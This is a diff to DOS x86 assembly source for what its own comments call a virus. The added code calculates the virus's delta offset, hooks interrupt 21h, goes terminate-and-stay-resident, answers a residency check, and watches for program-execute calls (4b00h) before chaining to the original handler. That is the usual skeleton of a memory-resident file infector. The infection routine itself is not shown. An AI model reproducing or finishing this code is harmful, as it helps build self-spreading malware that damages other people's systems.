@@ -5,7 +5,7 @@
 org 0h
 
 
-call $+3  ; To calculate delta offset
+call short $+3  ; To calculate delta offset
 start:
      pop bp           ; BP = Delta+3
      sub bp, 3        ; To get to the True start of the virus
@@ -24,13 +24,19 @@ install:
      mov ax, 2521h         ; Set vector 21h
      mov dx, new_int21+bp  ; DS:DX = new_int21
      int 21h
-      
+     mov ax, 3100h         ; Terminate and Stay resident
+     int 21h
 
+
+dont_install:
+     mov ax, 4c00h
+     int 21h
 
 
 
 new_int21:
-     pusha
+     push bp
+     push ax
      call near .past_bp
 .bp_shi dw 0
 .past_bp: 
@@ -38,10 +44,18 @@ new_int21:
      sub bp, 2
      mov word ax, [bp]
      mov bp, ax             ; BP = file delta offset
+     pop ax
+.what_func:
+     cmp ax, 9a8ah
+     je send_msg          ; Report that we are in memory
+     cmp ax, 4b00h
+
+.call_int21:
+     jmp short goto_int21
 
 
 
-goto_int21: db 0EAh, 00h, 00h, 00h, 00h
+goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand
 
 data_section:
      .save_bp dw 0
